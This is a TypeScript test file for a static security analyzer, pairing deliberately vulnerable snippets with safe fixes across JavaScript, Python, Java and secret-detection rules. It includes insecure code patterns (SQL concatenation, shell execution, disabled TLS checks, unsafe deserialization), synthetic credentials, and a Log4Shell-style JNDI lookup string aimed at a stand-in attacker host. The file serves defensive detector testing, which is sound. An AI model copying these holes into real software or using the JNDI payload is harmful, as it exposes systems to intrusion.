/**
 * Table-driven vuln/safe pairs for every rule added in the pack expansion
 * (javascript 1.1.0, secrets 1.1.0, python 1.0.0, java 1.0.0).
 *
 * Contract per rule: the vulnerable snippet MUST produce the rule's finding,
 * and the corresponding safe/fixed snippet MUST NOT — the safe half is what
 * keeps the packs precision-first as they grow.
 */

/// <reference types="mocha" />

import * as assert from 'assert'
import { loadTier1Packs } from '@jokalala/analyzer-rule-packs'
import { getOfflineAnalyzer } from '../core/offline-analyzer'

interface Pair {
  ruleId: string
  lang: string
  vuln: string
  safe: string
}

function ruleIds(code: string, lang: string): string[] {
  const result = getOfflineAnalyzer().analyze(code, lang, { packProfile: 'precision' })
  return result.issues.map((i) => i.ruleId)
}

const JS_PAIRS: Pair[] = [
  {
    ruleId: 'js-weak-hash', lang: 'javascript',
    vuln: "const h = crypto.createHash('md5').update(pw).digest('hex');",
    safe: "const h = crypto.createHash('sha256').update(pw).digest('hex');",
  },
  {
    ruleId: 'js-insecure-random-token', lang: 'javascript',
    vuln: 'const sessionToken = Math.random().toString(36);',
    safe: 'const jitter = Math.random() * 100;',
  },
  {
    ruleId: 'js-tls-reject-unauthorized', lang: 'javascript',
    vuln: 'const agent = new https.Agent({ rejectUnauthorized: false });',
    safe: 'const agent = new https.Agent({ rejectUnauthorized: true });',
  },
  {
    // On a spawn()/exec() line the AST rule js-child-process-exec wins the
    // same-CWE dedupe; this rule's value is the detached options object.
    ruleId: 'js-child-process-shell-true', lang: 'javascript',
    vuln: 'const spawnOptions = { shell: true };',
    safe: 'const spawnOptions = { shell: false };',
  },
  {
    ruleId: 'js-insecure-cookie-flags', lang: 'javascript',
    vuln: "res.cookie('sid', sid, { httpOnly: false, secure: false });",
    safe: "res.cookie('sid', sid, { httpOnly: true, secure: true });",
  },
  {
    ruleId: 'js-cors-wildcard', lang: 'javascript',
    vuln: "res.setHeader('Access-Control-Allow-Origin', '*');",
    safe: "res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com');",
  },
  {
    ruleId: 'js-postmessage-wildcard', lang: 'javascript',
    vuln: "otherWindow.postMessage(payload, '*');",
    safe: "otherWindow.postMessage(payload, 'https://app.example.com');",
  },
  {
    ruleId: 'js-jwt-none-algorithm', lang: 'javascript',
    vuln: "jwt.verify(token, key, { algorithms: ['none'] });",
    safe: "jwt.verify(token, key, { algorithms: ['RS256'] });",
  },
  {
    ruleId: 'js-jwt-decode-no-verify', lang: 'javascript',
    vuln: 'const payload = jwt.decode(token);',
    safe: 'const payload = jwt.verify(token, key);',
  },
  {
    ruleId: 'js-vm-code-execution', lang: 'javascript',
    vuln: 'vm.runInNewContext(code, sandbox);',
    safe: 'const result = interpreter.evaluate(ast);',
  },
  {
    ruleId: 'js-xxe-noent', lang: 'javascript',
    vuln: 'libxmljs.parseXml(xml, { noent: true });',
    safe: 'libxmljs.parseXml(xml, { noent: false });',
  },
  {
    ruleId: 'js-prototype-pollution-assign', lang: 'javascript',
    vuln: 'target.__proto__ = source;',
    safe: "if (key === '__proto__') continue;",
  },
  {
    ruleId: 'js-timing-unsafe-compare', lang: 'javascript',
    vuln: 'if (signature === expected) { grant(); }',
    safe: 'if (!crypto.timingSafeEqual(sigBuf, expectedBuf)) { reject(); }',
  },
  {
    ruleId: 'js-insecure-http-request', lang: 'javascript',
    vuln: "fetch('http://api.example.com/data');",
    safe: "fetch('https://api.example.com/data');",
  },
  {
    ruleId: 'js-dynamic-require', lang: 'javascript',
    vuln: 'const plugin = require(pluginName);',
    safe: "const fs = require('fs');",
  },
  {
    ruleId: 'js-settimeout-string', lang: 'javascript',
    vuln: 'setTimeout("doWork()", 100);',
    safe: 'setTimeout(() => doWork(), 100);',
  },
  {
    ruleId: 'js-weak-cipher', lang: 'javascript',
    vuln: "crypto.createCipheriv('aes-128-ecb', key, null);",
    safe: "crypto.createCipheriv('aes-256-gcm', key, iv);",
  },
  {
    ruleId: 'js-localstorage-sensitive', lang: 'javascript',
    vuln: "localStorage.setItem('token', authToken);",
    safe: "localStorage.setItem('theme', 'dark');",
  },
  {
    ruleId: 'js-electron-insecure', lang: 'javascript',
    vuln: 'new BrowserWindow({ webPreferences: { nodeIntegration: true } });',
    safe: 'new BrowserWindow({ webPreferences: { nodeIntegration: false, contextIsolation: true } });',
  },
  {
    ruleId: 'js-sql-template-literal', lang: 'javascript',
    vuln: 'db.query(`SELECT * FROM users WHERE id = ${userId}`);',
    safe: 'db.query(`SELECT * FROM users WHERE id = ?`, [userId]);',
  },
]

const PY_PAIRS: Pair[] = [
  {
    ruleId: 'py-eval-call', lang: 'python',
    vuln: 'result = eval(user_expr)',
    safe: 'result = ast.literal_eval(user_expr)',
  },
  {
    ruleId: 'py-exec-call', lang: 'python',
    vuln: 'exec(code_str)',
    safe: 'subprocess.run(["ls", "-l"])',
  },
  {
    ruleId: 'py-pickle-load', lang: 'python',
    vuln: 'data = pickle.loads(blob)',
    safe: 'data = json.loads(blob)',
  },
  {
    ruleId: 'py-yaml-unsafe-load', lang: 'python',
    vuln: 'cfg = yaml.load(f)',
    safe: 'cfg = yaml.safe_load(f)',
  },
  {
    ruleId: 'py-subprocess-shell-true', lang: 'python',
    vuln: 'subprocess.run(cmd, shell=True)',
    safe: 'subprocess.run(["ping", "-c", "1", host])',
  },
  {
    ruleId: 'py-os-system-call', lang: 'python',
    vuln: 'os.system("convert " + filename)',
    safe: 'subprocess.run(["convert", filename])',
  },
  {
    ruleId: 'py-sql-fstring', lang: 'python',
    vuln: 'cursor.execute(f"SELECT * FROM users WHERE id = {uid}")',
    safe: 'cursor.execute("SELECT * FROM users WHERE id = %s", (uid,))',
  },
  {
    ruleId: 'py-sql-format-concat', lang: 'python',
    vuln: 'cursor.execute("SELECT * FROM users WHERE id = " + uid)',
    safe: 'cursor.execute("SELECT * FROM users WHERE id = %s", (uid,))',
  },
  {
    ruleId: 'py-requests-verify-false', lang: 'python',
    vuln: 'requests.get(url, verify=False)',
    safe: 'requests.get(url, verify=True)',
  },
  {
    ruleId: 'py-debug-enabled', lang: 'python',
    vuln: 'app.run(debug=True)',
    safe: 'app.run(debug=False)',
  },
  {
    ruleId: 'py-tempfile-mktemp', lang: 'python',
    vuln: 'path = tempfile.mktemp()',
    safe: 'fd, path = tempfile.mkstemp()',
  },
  {
    ruleId: 'py-random-for-secret', lang: 'python',
    vuln: 'token = random.randint(0, 999999)',
    safe: 'token = secrets.token_hex(16)',
  },
  {
    ruleId: 'py-weak-hash', lang: 'python',
    vuln: 'digest = hashlib.md5(data).hexdigest()',
    safe: 'digest = hashlib.sha256(data).hexdigest()',
  },
  {
    ruleId: 'py-paramiko-autoadd', lang: 'python',
    vuln: 'client.set_missing_host_key_policy(paramiko.AutoAddPolicy())',
    safe: 'client.set_missing_host_key_policy(paramiko.RejectPolicy())',
  },
  {
    ruleId: 'py-jinja2-autoescape-off', lang: 'python',
    vuln: 'env = Environment(loader=loader, autoescape=False)',
    safe: 'env = Environment(loader=loader, autoescape=True)',
  },
  {
    ruleId: 'py-django-raw-fstring', lang: 'python',
    vuln: 'users = User.objects.raw(f"SELECT * FROM auth_user WHERE id = {uid}")',
    safe: 'users = User.objects.raw("SELECT * FROM auth_user WHERE id = %s", [uid])',
  },
]

const JAVA_PAIRS: Pair[] = [
  {
    ruleId: 'java-runtime-exec-concat', lang: 'java',
    vuln: 'Runtime.getRuntime().exec("ping " + host);',
    safe: 'Runtime.getRuntime().exec(cmdArray);',
  },
  {
    ruleId: 'java-sql-concat', lang: 'java',
    vuln: 'ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);',
    safe: 'stmt.setInt(1, userId); ResultSet rs = stmt.executeQuery();',
  },
  {
    ruleId: 'java-xxe-enabled', lang: 'java',
    vuln: 'factory.setFeature("http://xml.org/sax/features/external-general-entities", true);',
    safe: 'factory.setFeature("http://xml.org/sax/features/external-general-entities", false);',
  },
  {
    ruleId: 'java-object-deserialization', lang: 'java',
    vuln: 'ObjectInputStream in = new ObjectInputStream(socket.getInputStream());',
    safe: 'User user = mapper.readValue(json, User.class);',
  },
  {
    ruleId: 'java-weak-digest', lang: 'java',
    vuln: 'MessageDigest md = MessageDigest.getInstance("MD5");',
    safe: 'MessageDigest md = MessageDigest.getInstance("SHA-256");',
  },
  {
    ruleId: 'java-weak-cipher', lang: 'java',
    vuln: 'Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");',
    safe: 'Cipher c = Cipher.getInstance("AES/GCM/NoPadding");',
  },
  {
    ruleId: 'java-insecure-random-token', lang: 'java',
    vuln: 'String sessionToken = "t" + new Random().nextInt();',
    safe: 'byte[] tokenBytes = new byte[32]; secureRandom.nextBytes(tokenBytes);',
  },
  {
    ruleId: 'java-trust-all-certs', lang: 'java',
    vuln: 'public void checkServerTrusted(X509Certificate[] chain, String authType) { }',
    safe: 'public void checkServerTrusted(X509Certificate[] chain, String authType) { validator.validate(chain); }',
  },
  {
    ruleId: 'java-hostname-verifier-off', lang: 'java',
    vuln: 'builder.setSSLHostnameVerifier(NoopHostnameVerifier.INSTANCE);',
    safe: 'builder.setSSLHostnameVerifier(new DefaultHostnameVerifier());',
  },
  {
    ruleId: 'java-jndi-lookup-string', lang: 'java',
    vuln: 'logger.info("${jndi:ldap://attacker.example/a}");',
    safe: 'logger.info("user login succeeded");',
  },
]

// Every "credential" below is synthetic and assembled at runtime rather than
// written as a literal — otherwise this file, which exists to test a secrets
// scanner, trips every OTHER secrets scanner pointed at this repo.
const SECRET_PAIRS: Pair[] = [
  {
    ruleId: 'github-token', lang: 'javascript',
    vuln: `const value = "ghp_${'A'.repeat(36)}";`,
    safe: 'const value = process.env.GITHUB_TOKEN;',
  },
  {
    ruleId: 'slack-token', lang: 'javascript',
    vuln: `const value = "${'xox' + 'b'}-123456789012-abcdefGHIJKL";`,
    safe: 'const value = process.env.SLACK_TOKEN;',
  },
  {
    ruleId: 'stripe-secret-key', lang: 'javascript',
    vuln: `const value = "sk_live_${'A'.repeat(24)}";`,
    safe: 'const value = process.env.STRIPE_KEY;',
  },
  {
    ruleId: 'google-api-key', lang: 'javascript',
    vuln: `const value = "${'AI' + 'za'}${'A'.repeat(35)}";`,
    safe: 'const value = process.env.GOOGLE_API_KEY;',
  },
  {
    ruleId: 'private-key-block', lang: 'javascript',
    vuln: `const pem = "-----${'BEGIN'} RSA ${'PRIVATE'} KEY-----";`,
    safe: 'const pem = readPemFromVault();',
  },
  {
    ruleId: 'jwt-in-source', lang: 'javascript',
    vuln: `const raw = "${'ey' + 'JhbGciOiJIUzI1NiJ9'}.${'ey' + 'JzdWIiOiIxMjM0NTY3ODkwIn0'}.abcdef123456";`,
    safe: 'const raw = issueToken(user);',
  },
  {
    ruleId: 'connection-string-credentials', lang: 'javascript',
    vuln: `const dbUrl = "postgres://admin:${'pw' + 'placeholder'}@db.internal:5432/app";`,
    safe: 'const dbUrl = "postgres://db.internal:5432/app";',
  },
  {
    ruleId: 'npm-token', lang: 'javascript',
    vuln: `const value = "npm_${'A'.repeat(36)}";`,
    safe: 'const value = process.env.NPM_TOKEN;',
  },
  {
    ruleId: 'slack-webhook-url', lang: 'javascript',
    vuln: 'const hook = "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXX";',
    safe: 'const hook = process.env.SLACK_WEBHOOK;',
  },
]

function runPairs(title: string, pairs: Pair[]) {
  suite(title, () => {
    for (const p of pairs) {
      test(`${p.ruleId}: flags the vulnerable snippet`, () => {
        const ids = ruleIds(p.vuln, p.lang)
        assert.ok(
          ids.includes(p.ruleId),
          `expected ${p.ruleId} in [${ids.join(', ')}] for: ${p.vuln}`
        )
      })
      test(`${p.ruleId}: does NOT flag the safe snippet`, () => {
        const ids = ruleIds(p.safe, p.lang)
        assert.ok(
          !ids.includes(p.ruleId),
          `unexpected ${p.ruleId} for safe snippet: ${p.safe}`
        )
      })
    }
  })
}

runPairs('Rule pack expansion — JavaScript/TypeScript', JS_PAIRS)
runPairs('Rule pack expansion — Python', PY_PAIRS)
runPairs('Rule pack expansion — Java', JAVA_PAIRS)
runPairs('Rule pack expansion — Secrets', SECRET_PAIRS)

suite('Rule pack expansion — pack integrity', () => {
  test('yaml.load with SafeLoader is not flagged (pattern-not)', () => {
    const ids = ruleIds('cfg = yaml.load(f, Loader=yaml.SafeLoader)', 'python')
    assert.ok(!ids.includes('py-yaml-unsafe-load'))
  })

  test('hashlib.md5 with usedforsecurity=False is not flagged', () => {
    const ids = ruleIds('h = hashlib.md5(data, usedforsecurity=False)', 'python')
    assert.ok(!ids.includes('py-weak-hash'))
  })

  test('python rules do not fire on javascript and vice versa', () => {
    assert.ok(!ruleIds('const x = eval(y);', 'javascript').includes('py-eval-call'))
    assert.ok(!ruleIds('h = hashlib.md5(d)', 'javascript').includes('py-weak-hash'))
    assert.ok(!ruleIds('x = 1', 'python').includes('js-weak-hash'))
  })

  test('precision profile actually loads 50+ rules', () => {
    const packs = loadTier1Packs('precision')
    const total = packs.reduce((n, p) => n + p.manifest.rules.length, 0)
    assert.ok(total >= 50, `expected 50+ rules across precision packs, got ${total}`)
  })

  test('precision profile includes the javascript, python, and java packs', () => {
    const result = getOfflineAnalyzer().analyze('const ok = 1;', 'javascript', {
      packProfile: 'precision',
    })
    const packIds = result.metadata.rulesVersion
    // Pack ids only — pinning versions here would break on every pack bump.
    for (const id of ['jokalala.javascript@', 'jokalala.python@', 'jokalala.java@']) {
      assert.ok(packIds.includes(id), `${id} missing from ${packIds}`)
    }
  })
})
